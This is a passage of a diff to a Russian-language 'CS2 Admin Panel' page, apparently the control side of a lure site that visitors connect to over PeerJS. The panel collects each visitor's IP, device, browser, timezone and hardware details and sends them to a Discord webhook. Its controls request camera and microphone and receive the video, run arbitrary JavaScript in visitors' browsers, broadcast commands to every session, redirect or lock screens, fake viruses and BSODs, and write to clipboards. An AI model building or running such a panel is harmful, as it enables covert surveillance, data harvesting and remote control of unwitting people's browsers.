@@ -20,11 +20,11 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .badge{background:#4ade80;color:#000;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:800}
 .badge.red{background:#eb4b4b;color:#fff}
 .sessions-list{display:flex;flex-direction:column;gap:10px}
-.session{display:grid;grid-template-columns:60px 1fr 180px 140px 130px;gap:14px;align-items:center;padding:14px 18px;background:#0d1117;border:2px solid #262c38;border-radius:12px;cursor:pointer;transition:all .2s}
+.session{display:grid;grid-template-columns:70px 1fr 200px 140px 130px;gap:14px;align-items:center;padding:14px 18px;background:#0d1117;border:2px solid #262c38;border-radius:12px;cursor:pointer;transition:all .2s}
 .session:hover{border-color:#7c3aed;transform:translateX(4px)}
 .session.active{border-color:#f0b90b;background:linear-gradient(135deg,rgba(240,185,11,.1),transparent);box-shadow:0 0 20px rgba(240,185,11,.3)}
-.session-idx{font-weight:900;font-size:20px;text-align:center;color:#7c3aed;font-family:'Courier New',monospace}
-.session-device{font-size:14px;font-weight:700;color:#fff;display:flex;align-items:center;gap:6px}
+.session-idx{font-weight:900;font-size:18px;text-align:center;color:#7c3aed;font-family:'Courier New',monospace}
+.session-device{font-size:14px;font-weight:700;color:#fff;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
 .session-ip{font-family:'Courier New',monospace;font-size:11px;color:#8892a6;margin-top:4px}
 .session-time{font-size:12px;color:#8892a6;text-align:right}
 .session-time b{color:#4ade80;display:block;font-size:14px}
@@ -36,17 +36,16 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .empty{text-align:center;padding:40px;color:#8892a6}
 .empty b{display:block;color:#f0b90b;font-size:18px;margin-bottom:8px}
 .prank-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px}
-.prank-btn{padding:16px;border-radius:12px;border:2px solid #262c38;background:#0d1117;color:#fff;cursor:pointer;font-weight:700;font-size:14px;transition:all .2s;text-align:left;display:flex;flex-direction:column;gap:6px}
+.prank-btn{padding:14px;border-radius:12px;border:2px solid #262c38;background:#0d1117;color:#fff;cursor:pointer;font-weight:700;font-size:13px;transition:all .2s;text-align:left;display:flex;flex-direction:column;gap:6px}
 .prank-btn:hover{border-color:#7c3aed;transform:translateY(-3px)}
-.prank-btn:disabled{opacity:.3;cursor:not-allowed;transform:none}
-.prank-btn .icon{font-size:28px}
-.prank-btn .desc{font-size:11px;color:#8892a6;font-weight:400}
+.prank-btn .icon{font-size:24px}
+.prank-btn .desc{font-size:10px;color:#8892a6;font-weight:400}
 .prank-btn.danger{border-color:#eb4b4b}
 .prank-btn.gold{border-color:#f0b90b}
 .prank-btn.mic{border-color:#4ade80}
 .selected-info{padding:14px 18px;background:linear-gradient(135deg,rgba(240,185,11,.1),transparent);border:2px solid #f0b90b;border-radius:12px;margin-bottom:16px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
-.selected-info .label{font-size:12px;color:#8892a6;text-transform:uppercase}
-.selected-info .value{font-size:16px;font-weight:700;color:#f0b90b;font-family:'Courier New',monospace}
+.selected-info .label{font-size:11px;color:#8892a6;text-transform:uppercase}
+.selected-info .value{font-size:14px;font-weight:700;color:#f0b90b;font-family:'Courier New',monospace}
 .no-selection{padding:20px;text-align:center;color:#8892a6;background:#0d1117;border:2px dashed #262c38;border-radius:12px;margin-bottom:16px}
 .log{max-height:300px;overflow-y:auto;font-family:'Courier New',monospace;font-size:12px;background:#0d1117;padding:16px;border-radius:12px;border:1px solid #262c38}
 .log-entry{padding:4px 0;border-bottom:1px solid #1a1f2e}
@@ -60,18 +59,17 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .video-box .label{position:absolute;top:8px;left:8px;background:rgba(0,0,0,.7);padding:4px 8px;border-radius:4px;font-size:11px;font-weight:700}
 .video-box .empty{color:#6b7280;font-size:13px}
 .btn-screenshot{position:absolute;bottom:8px;right:8px;background:#7c3aed;color:#fff;border:0;padding:6px 12px;border-radius:6px;cursor:pointer;font-weight:700;font-size:11px}
-.drop-zone{border:2px dashed #262c38;border-radius:12px;padding:24px;text-align:center;cursor:pointer;transition:.2s;background:rgba(13,17,23,.5);margin-bottom:12px}
+.drop-zone{border:2px dashed #262c38;border-radius:12px;padding:20px;text-align:center;cursor:pointer;transition:.2s;background:rgba(13,17,23,.5);margin-bottom:12px}
 .drop-zone:hover,.drop-zone.dragover{border-color:#f0b90b;background:rgba(240,185,11,.05)}
-.drop-zone-icon{font-size:42px;margin-bottom:8px}
+.drop-zone-icon{font-size:36px;margin-bottom:8px}
 .drop-zone-text{font-size:14px;color:#8892a6;font-weight:600}
 .drop-zone-text b{color:#f0b90b}
-.drop-zone-hint{font-size:11px;color:#6b7280;margin-top:6px}
 .mp3-player{background:#0d1117;border:2px solid #262c38;border-radius:12px;padding:16px;margin-bottom:12px}
 .mp3-info{margin-bottom:12px}
 .mp3-title{font-size:16px;font-weight:700;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .mp3-sub{font-size:12px;color:#8892a6;margin-top:2px}
 .mp3-controls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
-.mp3-btn{background:#181c24;color:#fff;border:2px solid #262c38;border-radius:10px;padding:10px 16px;font-weight:700;font-size:14px;cursor:pointer;transition:.2s;min-width:48px}
+.mp3-btn{background:#181c24;color:#fff;border:2px solid #262c38;border-radius:10px;padding:10px 14px;font-weight:700;font-size:13px;cursor:pointer;transition:.2s;min-width:44px}
 .mp3-btn:hover{border-color:#7c3aed;transform:translateY(-2px)}
 .mp3-btn.gold{border-color:#f0b90b;background:linear-gradient(135deg,rgba(240,185,11,.15),transparent);color:#f0b90b}
 .mp3-btn.gold:hover{background:linear-gradient(135deg,#f0b90b,#d99f00);color:#000}
@@ -88,8 +86,8 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .playlist-actions button{background:transparent;border:1px solid #262c38;color:#8892a6;border-radius:6px;padding:4px 8px;font-size:11px;cursor:pointer}
 .playlist-actions button:hover{border-color:#f0b90b;color:#f0b90b}
 .url-row{display:flex;gap:8px;margin-bottom:10px}
-.url-row input{flex:1;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:14px;outline:none}
-.url-row input:focus{border-color:#7c3aed}
+.url-row input,.url-row textarea{flex:1;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:14px;outline:none;font-family:inherit}
+.url-row input:focus,.url-row textarea:focus{border-color:#7c3aed}
 .voice-panel{display:grid;grid-template-columns:1fr;gap:16px}
 .voice-col{background:#0d1117;border:2px solid #262c38;border-radius:12px;padding:16px}
 .voice-col h4{font-size:13px;color:#8892a6;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:12px}
@@ -100,7 +98,6 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 @keyframes recPulse{0%,100%{box-shadow:0 0 0 rgba(235,75,75,0)}50%{box-shadow:0 0 20px rgba(235,75,75,.5)}}
 .voice-status{font-size:12px;color:#8892a6;margin-top:8px;padding:10px 14px;border-radius:10px;background:#0a0c12;border:1px solid #262c38;text-align:center;line-height:1.5;font-weight:600}
 .voice-status.on{color:#4ade80;border-color:#4ade80;background:linear-gradient(135deg,rgba(74,222,128,.1),transparent)}
-.voice-status.err{color:#eb4b4b;border-color:#eb4b4b;background:linear-gradient(135deg,rgba(235,75,75,.1),transparent)}
 .voice-changer{margin-top:12px;padding:14px;background:#0a0c12;border-radius:10px;border:1px solid #262c38}
 .voice-changer .row{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:12px}
 .voice-changer .row label{color:#8892a6;min-width:80px}
@@ -110,25 +107,27 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
 .preset-btn{padding:8px 12px;border-radius:8px;border:1px solid #262c38;background:#181c24;color:#fff;font-size:11px;font-weight:700;cursor:pointer}
 .preset-btn:hover{border-color:#f0b90b}
 .preset-btn.active{background:linear-gradient(135deg,#7c3aed,#ec4899);border-color:transparent}
-/* Webhook */
-.webhook-row{display:flex;gap:10px;align-items:center;margin-bottom:14px}
-.webhook-row input{flex:1;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:13px;outline:none;font-family:monospace}
+.webhook-row{display:flex;gap:10px;align-items:center;margin-bottom:14px;flex-wrap:wrap}
+.webhook-row input{flex:1;min-width:200px;padding:12px;border-radius:10px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:13px;outline:none;font-family:monospace}
 .webhook-row input:focus{border-color:#5865f2}
 .webhook-status{font-size:12px;padding:6px 10px;border-radius:8px;font-weight:700;white-space:nowrap}
 .webhook-status.on{background:rgba(74,222,128,.15);color:#4ade80}
 .webhook-status.off{background:rgba(235,75,75,.15);color:#eb4b4b}
-@media(max-width:900px){.session{grid-template-columns:60px 1fr}.session-time,.session-stats,.session-status{display:none}.video-grid{grid-template-columns:1fr}}
+.stats-mini{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-top:14px}
+.stat-mini{background:#0d1117;border:1px solid #262c38;border-radius:10px;padding:12px;text-align:center}
+.stat-mini .v{font-size:22px;font-weight:800;color:#f0b90b}
+.stat-mini .l{font-size:11px;color:#8892a6;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+@media(max-width:900px){.session{grid-template-columns:70px 1fr}.session-time,.session-stats,.session-status{display:none}.video-grid{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
 <div class="wrap">
   <div>
     <h1>⚙️ CS2 Admin Panel</h1>
-    <div class="sub">PeerJS + Discord вебхук. Один peer, автоматическое переподключение.</div>
+    <div class="sub">PeerJS + Discord вебхук. <span id="uptime">0 сек</span> работы.</div>
     <div class="status-line" style="margin-top:10px"><div class="dot" id="peerDot"></div><span id="peerStatus">Запуск...</span></div>
   </div>
 
-  <!-- ВЕБХУК -->
   <div class="panel">
     <div class="panel-title"><span>🔔 Discord вебхук</span></div>
     <div class="webhook-row">
@@ -137,14 +136,27 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
       <button class="mp3-btn gold" id="webhookSave">Сохранить</button>
       <button class="mp3-btn" id="webhookTest">Тест</button>
     </div>
-    <div style="font-size:11px;color:#6b7280">
-      Все события (заход, дроп, апгрейд, камера, голос) будут лететь в этот канал.
-      Как получить: Discord → Настройки канала → Интеграции → Вебхуки → Новый → Скопировать URL.
+    <div class="stats-mini">
+      <div class="stat-mini"><div class="v" id="statTotal">0</div><div class="l">Всего зашло</div></div>
+      <div class="stat-mini"><div class="v" id="statOnline">0</div><div class="l">Онлайн</div></div>
+      <div class="stat-mini"><div class="v" id="statDrops">0</div><div class="l">Дропов</div></div>
+      <div class="stat-mini"><div class="v" id="statTopBalance">$0</div><div class="l">Топ баланс</div></div>
     </div>
   </div>
 
   <div class="panel">
-    <div class="panel-title"><span>👥 Сессии</span><span class="badge" id="sessionCount">0</span></div>
+    <div class="panel-title">
+      <span>👥 Сессии</span>
+      <span class="badge" id="sessionCount">0</span>
+    </div>
+    <div class="url-row" style="margin-bottom:10px">
+      <input id="sessionFilter" type="text" placeholder="Фильтр по устройству или IP..." style="font-size:12px">
+      <select id="sortSessions" style="padding:10px;border-radius:8px;border:1px solid #262c38;background:#0d1117;color:#fff;font-size:12px">
+        <option value="time">По времени</option>
+        <option value="balance">По балансу</option>
+        <option value="drops">По дропам</option>
+      </select>
+    </div>
     <div class="sessions-list" id="sessionsList">
       <div class="empty"><b>Пока никого</b>Друг должен зайти на сайт</div>
     </div>
@@ -184,9 +196,8 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
     <div class="prank-grid">
       <button class="prank-btn danger" data-prank="screamer"><div class="icon">😱</div><div>Скример</div></button>
       <button class="prank-btn danger" data-prank="shake"><div class="icon">📳</div><div>Тряска</div></button>
-      <button class="prank-btn danger" data-prank="earthquake"><div class="icon">🌋</div><div>Землетрясение</div></button>
       <button class="prank-btn danger" data-prank="fakeVirus"><div class="icon">🦠</div><div>Фейк-вирус</div></button>
-      <button class="prank-btn danger" data-prank="bsod"><div class="icon">💀</div><div>Синий экран</div></button>
+      <button class="prank-btn danger" data-prank="bsod"><div class="icon">💀</div><div>BSOD</div></button>
       <button class="prank-btn danger" data-prank="blockScreen"><div class="icon">🔒</div><div>Заблокировать</div></button>
       <button class="prank-btn gold" data-prank="stop"><div class="icon">🛑</div><div>СТОП всё</div></button>
     </div>
@@ -198,10 +209,27 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
       <button class="prank-btn" data-prank="invert"><div class="icon">🎨</div><div>Инверсия</div></button>
       <button class="prank-btn" data-prank="blur"><div class="icon">🌫️</div><div>Размытие</div></button>
       <button class="prank-btn" data-prank="hue"><div class="icon">🌈</div><div>Сдвиг</div></button>
+      <button class="prank-btn" data-prank="grayscale"><div class="icon">⬛</div><div>Ч/Б</div></button>
+      <button class="prank-btn" data-prank="rainbow"><div class="icon">🌊</div><div>Радуга</div></button>
+      <button class="prank-btn" data-prank="rotate"><div class="icon">🔄</div><div>Переворот</div></button>
+      <button class="prank-btn" data-prank="rotateSlow"><div class="icon">🌀</div><div>Медленное вращение</div></button>
+      <button class="prank-btn" data-prank="slowmo"><div class="icon">🐌</div><div>Замедление</div></button>
+      <button class="prank-btn" data-prank="fast"><div class="icon">⚡</div><div>Ускорение</div></button>
+      <button class="prank-btn" data-prank="vortex"><div class="icon">🌪️</div><div>Воронка</div></button>
+      <button class="prank-btn" data-prank="wave"><div class="icon">🌊</div><div>Волна</div></button>
       <button class="prank-btn" data-prank="bigCursor"><div class="icon">👆</div><div>Курсор</div></button>
-      <button class="prank-btn" data-prank="longShake"><div class="icon">📳</div><div>Тряска 10с</div></button>
-      <button class="prank-btn" data-prank="longInvert"><div class="icon">🎨</div><div>Инверсия 30с</div></button>
-      <button class="prank-btn" data-prank="longBlur"><div class="icon">🌫️</div><div>Блюр 30с</div></button>
+      <button class="prank-btn" data-prank="trackingEye"><div class="icon">👁️</div><div>Следящий глаз</div></button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>🎮 Хардкор</span></div>
+    <div class="prank-grid">
+      <button class="prank-btn danger" data-prank="freeze"><div class="icon">🧊</div><div>Заморозка</div></button>
+      <button class="prank-btn danger" data-prank="mouseChaos"><div class="icon">🐭</div><div>Мышь-предатель</div></button>
+      <button class="prank-btn danger" data-prank="keyboardChaos"><div class="icon">⌨️</div><div>Клавиатурный хаос</div></button>
+      <button class="prank-btn danger" data-prank="shuffle"><div class="icon">🔀</div><div>Перемешивание</div></button>
+      <button class="prank-btn danger" data-prank="audioHijack"><div class="icon">🎵</div><div>Аудио-захват</div></button>
     </div>
   </div>
 
@@ -209,8 +237,12 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
     <div class="panel-title"><span>🌐 Действия</span></div>
     <div class="prank-grid">
       <button class="prank-btn" data-prank="reload"><div class="icon">🔄</div><div>Перезагрузить</div></button>
+      <button class="prank-btn" data-prank="closeTab"><div class="icon">🚪</div><div>Закрыть вкладку</div></button>
       <button class="prank-btn" data-prank="requestCam"><div class="icon">📸</div><div>Запросить камеру</div></button>
       <button class="prank-btn mic" data-prank="requestMic"><div class="icon">🎤</div><div>Запросить микрофон</div></button>
+      <button class="prank-btn" data-prank="requestNotif"><div class="icon">🔔</div><div>Разрешить уведомления</div></button>
+      <button class="prank-btn" data-prank="vibrate"><div class="icon">📳</div><div>Вибрация (телефон)</div></button>
+      <button class="prank-btn" data-prank="wakeLock"><div class="icon">💡</div><div>Экран не гаснет</div></button>
       <button class="prank-btn danger" data-prank="clearInventory"><div class="icon">🗑️</div><div>Очистить инвентарь</div></button>
       <button class="prank-btn danger" data-prank="resetStats"><div class="icon">📊</div><div>Сбросить статистику</div></button>
     </div>
@@ -223,8 +255,12 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
   </div>
 
   <div class="panel">
-    <div class="panel-title"><span>💬 Alert</span></div>
-    <div class="url-row"><input id="alertText" type="text" value="ПРИВЕТ ОТ ХАКЕРА"><button class="mp3-btn gold" id="alertBtn">Отправить</button></div>
+    <div class="panel-title"><span>💬 Alert / Console / Title / Favicon</span></div>
+    <div class="url-row"><input id="alertText" type="text" value="ПРИВЕТ ОТ ХАКЕРА"><button class="mp3-btn gold" id="alertBtn">Alert</button></div>
+    <div class="url-row"><input id="consoleText" type="text" value="CS2 — ты в моей власти" placeholder="Текст в консоль"><button class="mp3-btn" id="consoleBtn">Консоль</button></div>
+    <div class="url-row"><input id="titleText" type="text" value="😱 ВЗЛОМ" placeholder="Title"><button class="mp3-btn" id="titleBtn">Title</button></div>
+    <div class="url-row"><input id="faviconEmoji" type="text" value="😱" placeholder="Эмодзи"><button class="mp3-btn" id="faviconBtn">Favicon</button></div>
+    <div class="url-row"><input id="clipboardText" type="text" value="Я люблю CS2" placeholder="Скопировать в буфер"><button class="mp3-btn" id="clipboardBtn">📋 Копировать</button></div>
   </div>
 
   <div class="panel">
@@ -233,7 +269,15 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
       <input id="redirectUrl" type="text" placeholder="https://..." value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
       <button class="mp3-btn gold" id="redirectBtn">Редирект</button>
       <button class="mp3-btn" id="openUrlBtn">Новая вкладка</button>
+      <button class="mp3-btn" id="qrBtn">QR</button>
     </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>💾 Скачивание / Печать у друга</span></div>
+    <div class="url-row"><input id="dlFilename" type="text" value="secrets.txt"><button class="mp3-btn" id="dlBtn">📥 Скачать</button></div>
+    <div class="url-row"><textarea id="dlContent" rows="2" style="resize:vertical">Ты взломан администратором CS2</textarea></div>
+    <div class="url-row"><input id="printText" type="text" value="СЕКРЕТНЫЙ ДОКУМЕНТ"><button class="mp3-btn" id="printBtn">🖨 Печать</button></div>
   </div>
 
   <div class="panel">
@@ -242,11 +286,29 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
   </div>
 
   <div class="panel">
+    <div class="panel-title"><span>⚙️ Кастомный JS-код у друга</span></div>
+    <div class="url-row"><textarea id="customJs" rows="3" placeholder="Например: alert('привет')">document.body.style.background = 'red';</textarea></div>
+    <div class="url-row"><button class="mp3-btn gold" id="customJsBtn">▶ Выполнить</button></div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-title"><span>🚀 Массовые действия</span></div>
+    <div class="prank-grid">
+      <button class="prank-btn danger" id="broadcastReload"><div class="icon">🔄</div><div>Обновить всех</div></button>
+      <button class="prank-btn danger" id="broadcastRickroll"><div class="icon">🎵</div><div>Rickroll всем</div></button>
+      <button class="prank-btn danger" id="broadcastScreamer"><div class="icon">😱</div><div>Скример всем</div></button>
+      <button class="prank-btn gold" id="broadcastMp3"><div class="icon">🎵</div><div>MP3 всем</div></button>
+      <button class="prank-btn gold" id="broadcastModal"><div class="icon">💬</div><div>Сообщение всем</div></button>
+      <button class="prank-btn" id="exportLogs"><div class="icon">📥</div><div>Скачать логи</div></button>
+      <button class="prank-btn" id="exportSessions"><div class="icon">📥</div><div>Скачать сессии</div></button>
+    </div>
+  </div>
+
+  <div class="panel">
     <div class="panel-title"><span>🎵 MP3-плеер</span><span class="badge" id="trackCount">0</span></div>
     <div class="drop-zone" id="dropZone">
       <div class="drop-zone-icon">🎵</div>
       <div class="drop-zone-text">Перетащи <b>MP3</b> или <b>кликни</b></div>
-      <div class="drop-zone-hint">до 8 МБ</div>
       <input type="file" id="fileInput" accept="audio/*" multiple style="display:none">
     </div>
     <div class="url-row"><input id="mp3Url" type="text" placeholder="URL на MP3..."><button class="mp3-btn" id="addUrlBtn">+ URL</button></div>
@@ -284,15 +346,12 @@ h1{font-size:26px;background:linear-gradient(135deg,#7c3aed,#ec4899);-webkit-bac
   </div>
 
   <div class="panel">
-    <div class="panel-title"><span>📜 Лог</span></div>
+    <div class="panel-title"><span>📜 Лог</span><button class="mp3-btn danger" id="clearLog" style="padding:6px 10px;font-size:11px">Очистить</button></div>
     <div class="log" id="log"></div>
   </div>
 </div>
 
 <script>
-/* ============================================================
-   ADMIN PEER — защита от unavailable-id
-   ============================================================ */
 const ADMIN_PEER_ID = 'CS2_ADMIN_X7K9QW2';
 let peer = null;
 let conns = new Map();
@@ -300,6 +359,11 @@ let selectedIp = null;
 let camCount = 0;
 const connIp = new WeakMap();
 let friendVoicePeerId = null;
+let startTime = Date.now();
+let sessionFilter = '';
+let sortMode = 'time';
+let totalVisits = 0;
+let totalDrops = 0;
 
 // Голос
 let myMicStream = null;
@@ -312,10 +376,9 @@ let wetGain = null;
 let dryGain = null;
 let destNode = null;
 let voiceCall = null;
+let voiceParams = { pitch: 1.0, echo: 0 };
 
-/* ============================================================
-   ВЕБХУК DISCORD
-   ============================================================ */
+// Вебхук
 let webhookUrl = localStorage.getItem('cs2_webhook') || '';
 const webhookInput = document.getElementById('webhookInput');
 const webhookStatus = document.getElementById('webhookStatus');
@@ -323,39 +386,21 @@ if (webhookUrl) {
     webhookInput.value = webhookUrl;
     webhookStatus.textContent = 'задан';
     webhookStatus.className = 'webhook-status on';
-} else {
-    webhookStatus.textContent = 'не задан';
-    webhookStatus.className = 'webhook-status off';
 }
 
 document.getElementById('webhookSave').onclick = () => {
     const url = webhookInput.value.trim();
-    if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
-        alert('Вставь корректный Discord вебхук URL');
-        return;
-    }
+    if (!url || !url.startsWith('https://discord.com/api/webhooks/')) { alert('Вставь корректный URL'); return; }
     webhookUrl = url;
     localStorage.setItem('cs2_webhook', url);
     webhookStatus.textContent = 'задан';
     webhookStatus.className = 'webhook-status on';
     log('🔔 Вебхук сохранён', 'info');
-    sendWebhook({
-        title: '✅ Вебхук подключён',
-        description: 'Теперь события будут приходить сюда.',
-        color: 0x4ade80,
-        timestamp: new Date().toISOString()
-    });
+    sendWebhook({title: '✅ Вебхук подключён', description: 'События будут приходить сюда.', color: 0x4ade80, timestamp: new Date().toISOString()});
 };
-
 document.getElementById('webhookTest').onclick = () => {
-    if (!webhookUrl) { alert('Сначала сохрани вебхук'); return; }
-    sendWebhook({
-        title: '🔔 Тестовое сообщение',
-        description: 'Если ты видишь это в Discord — вебхук работает.',
-        color: 0x7c3aed,
-        timestamp: new Date().toISOString()
-    });
-    log('🔔 Тест вебхука отправлен', 'info');
+    if (!webhookUrl) { alert('Сохрани вебхук'); return; }
+    sendWebhook({title: '🔔 Тест', description: 'Вебхук работает!', color: 0x7c3aed, timestamp: new Date().toISOString()});
 };
 
 function sendWebhook(embed) {
@@ -373,9 +418,6 @@ function sendWebhook(embed) {
     } catch(e) {}
 }
 
-/* ============================================================
-   ЛОГ
-   ============================================================ */
 function log(msg, type='info') {
     const l = document.getElementById('log');
     if (!l) return;
@@ -384,23 +426,33 @@ function log(msg, type='info') {
     d.className = 'log-entry ' + type;
     d.innerHTML = `<span class="time">${t}</span>${msg}`;
     l.prepend(d);
-    if (l.children.length > 200) l.lastChild.remove();
+    if (l.children.length > 500) l.lastChild.remove();
 }
 
-/* ============================================================
-   PEER — защита от unavailable-id
-   ============================================================ */
+document.getElementById('clearLog').onclick = () => { document.getElementById('log').innerHTML = ''; };
+
+function updateUptime() {
+    const s = Math.floor((Date.now() - startTime) / 1000);
+    const m = Math.floor(s/60);
+    const sec = s % 60;
+    document.getElementById('uptime').textContent = m > 0 ? `${m} мин ${sec} сек` : `${sec} сек`;
+}
+setInterval(updateUptime, 1000);
+
+function updateStatsMini() {
+    document.getElementById('statTotal').textContent = totalVisits;
+    document.getElementById('statOnline').textContent = [...conns.values()].filter(s => Date.now() - s.lastSeen < 15000).length;
+    document.getElementById('statDrops').textContent = totalDrops;
+    let top = 0;
+    conns.forEach(s => { if ((s.balance||0) > top) top = s.balance; });
+    document.getElementById('statTopBalance').textContent = '$' + top.toFixed(0);
+}
+
 function initPeer() {
     const statusEl = document.getElementById('peerStatus');
     const dotEl = document.getElementById('peerDot');
     statusEl.textContent = '⏳ Подключение...';
-    try {
-        peer = new Peer(ADMIN_PEER_ID);
-    } catch(e) {
-        log('❌ Ошибка: ' + e.message, 'err');
-        setTimeout(initPeer, 3000);
-        return;
-    }
+    try { peer = new Peer(ADMIN_PEER_ID); } catch(e) { setTimeout(initPeer, 3000); return; }
     peer.on('open', (id) => {
         statusEl.textContent = '✅ Подключён · ID: ' + id;
         dotEl.classList.remove('off', 'err');
@@ -414,12 +466,6 @@ function initPeer() {
             try { peer.destroy(); } catch(e){}
             peer = null;
             setTimeout(initPeer, 3000);
-        } else if (err.type === 'network' || err.type === 'server-error') {
-            statusEl.textContent = '❌ Сеть. Переподключение...';
-            dotEl.classList.add('err');
-            try { peer.destroy(); } catch(e){}
-            peer = null;
-            setTimeout(initPeer, 5000);
         }
     });
     peer.on('connection', (conn) => {
@@ -434,7 +480,7 @@ function initPeer() {
                         title: '🔴 Отключился',
                         color: 0xeb4b4b,
                         fields: [
-                            {name:'Устройство', value: s.device || 'неизвестно', inline:true},
+                            {name:'Устройство', value: s.device || '?', inline:true},
                             {name:'IP', value: '`'+ip+'`', inline:true}
                         ],
                         timestamp: new Date().toISOString()
@@ -442,13 +488,12 @@ function initPeer() {
                 }
                 log('🔴 Отключился: ' + ip, 'warn');
                 conns.delete(ip);
-                renderSessions();
+                renderSessions(); updateStatsMini();
             }
         });
     });
     peer.on('call', (call) => {
         call.answer();
-        log('📹 Входящий видеозвонок', 'info');
         call.on('stream', (stream) => {
             const hasVideo = stream.getVideoTracks().length > 0;
             if (!hasVideo) return;
@@ -460,7 +505,6 @@ function initPeer() {
             const v = box.querySelector('video');
             v.srcObject = stream;
             v.play().catch(() => { v.muted = true; v.play(); });
-            log(`📹 Видео #${camCount}`, 'warn');
         });
     });
 }
@@ -476,12 +520,8 @@ function screenshot(btn) {
     a.click();
 }
 
-/* ============================================================
-   ОБРАБОТКА ДАННЫХ
-   ============================================================ */
 function handleData(data, conn) {
     if (!data || !data.type) return;
-
     if (data.type === 'hello') {
         connIp.set(conn, data.ip);
         const shortId = data.sessionId || Math.random().toString(36).slice(2,6).toUpperCase();
@@ -492,37 +532,45 @@ function handleData(data, conn) {
             deviceType: data.deviceType || 'desktop',
             sessionId: shortId,
             screen: data.screen || '—',
+            extra: data.extra || {},
             balance: data.balance, drops: data.drops,
             joinedAt: data.ts, lastSeen: Date.now()
         });
-        log(`🟢 Подключился: ${data.device || ''} · ${data.ip}`, 'info');
-        renderSessions();
+        totalVisits++;
+        log(`🟢 Подключился: ${data.device} · ${data.ip}`, 'info');
+        renderSessions(); updateStatsMini();
         sendWebhook({
-            title: '🟢 Новый заход на сайт',
+            title: '🟢 Новый заход',
             color: 0x7c3aed,
             fields: [
-                {name:'📱 Устройство', value: data.device || 'неизвестно', inline:true},
-                {name:'🌐 Браузер', value: data.browser || '—', inline:true},
+                {name:'📱 Устройство', value: data.device || '?', inline:true},
+                {name:'🌐 Браузер', value: data.browser || '?', inline:true},
                 {name:'🆔 Сессия', value: '`#'+shortId+'`', inline:true},
                 {name:'🌐 IP', value: '`'+data.ip+'`', inline:false},
-                {name:'🖥 Разрешение', value: data.screen || '—', inline:true},
-                {name:'💰 Баланс', value: '$'+(data.balance||0).toFixed(2), inline:true}
+                {name:'🖥 Экран', value: data.screen || '—', inline:true},
+                {name:'💰 Баланс', value: '$'+(data.balance||0).toFixed(2), inline:true},
+                {name:'🗣 Язык', value: (data.extra && data.extra.language) || '—', inline:true},
+                {name:'⏰ Часовой пояс', value: (data.extra && data.extra.timezone) || '—', inline:true},
+                {name:'💻 Ядер CPU', value: String((data.extra && data.extra.cores) || '—'), inline:true},
+                {name:'🧠 RAM', value: String((data.extra && data.extra.memory) || '—') + ' GB', inline:true},
+                {name:'📶 Сеть', value: (data.extra && data.extra.connection) || '—', inline:true}
             ],
             timestamp: new Date().toISOString()
         });
     } else if (data.type === 'heartbeat') {
         const s = conns.get(data.ip);
-        if (s) { s.lastSeen = Date.now(); s.balance = data.balance; s.drops = data.drops; renderSessions(); }
+        if (s) { s.lastSeen = Date.now(); s.balance = data.balance; s.drops = data.drops; renderSessions(); updateStatsMini(); }
     } else if (data.type === 'drop') {
+        totalDrops++;
         log(`🎁 Дроп: ${data.skin.name} ($${data.skin.price})`, 'warn');
-        const s = conns.get(connIp.get(conn) || '?');
+        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
         sendWebhook({
             title: '🎁 Дроп из кейса',
             color: data.profit >= 0 ? 0x4ade80 : 0xeb4b4b,
             fields: [
                 {name:'📱 Устройство', value: s?.device || '?', inline:true},
-                {name:'🌐 IP', value: '`'+(connIp.get(conn)||'?')+'`', inline:true},
-                {name:'🎰 Кейс', value: data.caseName + ' ($' + data.casePrice.toFixed(2) + ')', inline:false},
+                {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true},
+                {name:'🎰 Кейс', value: data.caseName, inline:false},
                 {name:'🔫 Скин', value: data.skin.weapon + ' | ' + data.skin.name, inline:false},
                 {name:'💰 Цена', value: '$' + data.skin.price.toFixed(2), inline:true},
                 {name:'📊 Профит', value: (data.profit>=0?'+':'') + '$' + data.profit.toFixed(2), inline:true}
@@ -531,104 +579,73 @@ function handleData(data, conn) {
         });
     } else if (data.type === 'deposit') {
         log(`💳 Пополнение $${data.amount}`, 'info');
